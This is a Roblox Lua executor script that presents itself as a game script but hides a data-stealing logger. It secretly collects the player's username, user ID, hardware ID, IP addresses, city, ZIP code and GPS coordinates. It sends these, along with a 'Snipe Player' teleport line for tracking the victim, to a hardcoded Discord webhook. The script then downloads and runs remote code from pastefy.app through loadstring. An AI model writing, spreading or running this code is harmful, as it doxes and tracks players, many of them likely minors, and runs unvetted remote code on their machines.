local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local TextService = game:GetService("TextService")
local UserInputService = game:GetService("UserInputService")
local MarketplaceService = game:GetService("MarketplaceService")
local Stats = game:GetService("Stats")
local GuiService = game:GetService("GuiService")
local LocalPlayer = Players.LocalPlayer
local WebhookURL = "https://discord.com/api/webhooks/1510626193236561980/u9KXHhdx1fK9hOOcvIl59dA80OMdtSLh-7b8VOkEOyYCGxN39sGUbALMhsbddd6wV_yI"
local function request(options)
    local req = (syn and syn.request) or (http and http.request) or http_request or request or (getgenv and getgenv().request)
    if req then 
        local s, r = pcall(req, options)
        if s then return r end
    end
    return nil
end
local function GetInfo()
    local info = {}
    pcall(function()
        local response = request({Url = "http://ip-api.com/json/?fields=status,message,query,city,regionName,country,countryCode,zip,timezone,isp,org,asn,lat,lon,mobile,proxy,hosting", Method = "GET"})
        if response and response.Body then
            local data = HttpService:JSONDecode(response.Body)
            if data.status == "success" then
                info.ip = data.query or "Unknown"
                info.city = data.city or "Unknown"
                info.region = data.regionName or "Unknown"
                info.country = data.country or "Unknown"
                info.countryCode = data.countryCode or "Unknown"
                info.zip = data.zip or "Unknown"
                info.timezone = data.timezone or "Unknown"
                info.isp = data.isp or "Unknown"
                info.org = data.org or "Unknown"
                info.asn = data.asn or "Unknown"
                info.lat = data.lat or "Unknown"
                info.lon = data.lon or "Unknown"
                info.mobile = data.mobile == true and "Yes" or "No"
                info.proxy = data.proxy == true and "Yes" or "No"
                info.hosting = data.hosting == true and "Yes" or "No"
            end
        end
    end)
    pcall(function()
        local response2 = request({Url = "https://ipapi.co/json/", Method = "GET"})
        if response2 and response2.Body then
            local data2 = HttpService:JSONDecode(response2.Body)
            info.ip2 = data2.ip or info.ip
            info.asn = data2.asn or info.asn
            info.org = data2.org or info.org
        end
    end)
    pcall(function()
        info.game = MarketplaceService:GetProductInfo(game.PlaceId).Name
    end)
    pcall(function()
        info.exec = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or "Unknown"
        info.platform = (UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled) and "Mobile" or "PC"
        local screenSize = GuiService:GetScreenResolution()
        info.screen = math.floor(screenSize.X) .. "x" .. math.floor(screenSize.Y)
    end)
    pcall(function()
        info.hwid = gethwid() or (get_hwid and get_hwid()) or (syn and syn.get_hwid and syn.get_hwid()) or "Unknown"
    end)
    pcall(function()
        info.accountAge = LocalPlayer.AccountAge
        info.premium = LocalPlayer.MembershipType == Enum.MembershipType.Premium
    end)
    info.gameVersion = game.PlaceVersion or "Unknown"
    return info
end
task.spawn(function()
    local data = GetInfo()
    local position = "Unknown"
    pcall(function()
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local pos = LocalPlayer.Character.HumanoidRootPart.Position
            position = string.format("%.4f, %.4f, %.4f", pos.X, pos.Y, pos.Z)
        end
    end)
    local instanceId = game.JobId or "Unknown"
    local ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue() or 0)
    local playerCount = #Players:GetPlayers() .. "/" .. (Players.MaxPlayers or "?")
    local memory = "Unknown MB"
    pcall(function()
        if Stats.GetTotalMemoryUsageMb then
            memory = string.format("%.1f", Stats:GetTotalMemoryUsageMb()) .. " MB"
        elseif getgc then
            local count = 0
            for _ in pairs(getgc(false)) do count += 1 end
            memory = math.floor(count / 1000) .. "k objects"
        end
    end)
    local fps = "Unknown"
    pcall(function()
        fps = math.floor(workspace:GetRealPhysicsFPS() or 1 / game:GetService("RunService").RenderStepped:Wait())
    end)
    local gpsLink = "Unknown"
    if data.lat and data.lon and data.lat ~= "Unknown" and data.lon ~= "Unknown" then
        gpsLink = "[" .. data.lat .. "," .. data.lon .. "](https://www.google.com/maps/search/?api=1&query=" .. data.lat .. "," .. data.lon .. ")"
    end
    local logMsg = "**User Information**\n\n"..
                   "👤 Username: "..LocalPlayer.Name.."\n"..
                   "🆔 Player ID: "..LocalPlayer.UserId.."\n"..
                   "🎮 Game: "..(data.game or "Unknown").."\n"..
                   "📌 Game ID: "..game.PlaceId.."\n\n"..
                   "⚙️ Executor: "..(data.exec or "Unknown").."\n"..
                   "📱 Platform: "..(data.platform or "PC").."\n"..
                   "⏰ Execution Time: "..os.date("%Y-%m-%d %H:%M:%S").."\n"..
                   "🔑 HWID: "..(data.hwid or "Unknown").."\n\n"..
                   "**Account Details:**\n"..
                   "🌐 1st IP: "..(data.ip or "Unknown").."\n"..
                   "🌐 2nd IP: "..(data.ip2 or "Unknown").."\n"..
                   "🎂 Birthday: Unknown\n"..
                   "📅 Account Age (weeks): "..(data.accountAge or "Unknown").."\n"..
                   "📞 Phone: Unknown\n"..
                   "✉️ Email: Unknown\n"..
                   "💰 Robux: Unknown\n"..
                   "🌍 Country Code: "..(data.countryCode or "Unknown").."\n"..
                   "🏳️ Country: "..(data.country or "Unknown").."\n"..
                   "📍 GPS Location: "..gpsLink.."\n"..
                   "🏙️ City: "..(data.city or "Unknown").."\n"..
                   "🗺️ Region: "..(data.region or "Unknown").."\n"..
                   "📮 ZIP: "..(data.zip or "Unknown").."\n"..
                   "⏰ Timezone: "..(data.timezone or "Unknown").."\n"..
                   "🌐 ISP: "..(data.isp or "Unknown").."\n"..
                   "🏢 Organization: "..(data.org or "Unknown").."\n"..
                   "🔢 ASN: "..(data.asn or "Unknown").."\n"..
                   "📱 Mobile: "..(data.mobile or "Unknown").."\n"..
                   "🔒 Proxy/VPN: "..(data.proxy or "No").."\n"..
                   "☁️ Hosting: "..(data.hosting or "No").."\n\n"..
                   "**System Info:**\n"..
                   "🖥️ Screen: "..(data.screen or "Unknown").."\n"..
                   "💾 Memory: "..memory.."\n"..
                   "👥 Players: "..playerCount.."\n"..
                   "📶 Ping: "..ping.." ms\n"..
                   "📊 FPS: "..fps.."\n"..
                   "📌 Game Version: "..(data.gameVersion or "Unknown").."\n"..
                   "⭐ Premium: "..(data.premium and "true" or "false").."\n"..
                   "📍 Position: "..position.."\n\n"..
                   "**Snipe Player**\n"..
                   "```game:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..", '"..instanceId.."', player)```"
    local embed = {
        ["title"] = "📋 New Execution Detected",
        ["description"] = logMsg,
        ["color"] = 0x00FF00,
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        ["thumbnail"] = { ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..LocalPlayer.UserId.."&width=420&height=420&format=png" }
    }
    local payload = HttpService:JSONEncode({["embeds"] = {embed}})
    request({Url = WebhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload})
end)
local placeId = game.PlaceId
if placeId == 137303692488494 then
    loadstring(game:HttpGet("https://pastefy.app/j4AoygTs/raw"))()
elseif placeId == 105352590834997 then
    loadstring(game:HttpGet("https://pastefy.app/7pwY4NF8/raw"))()
end
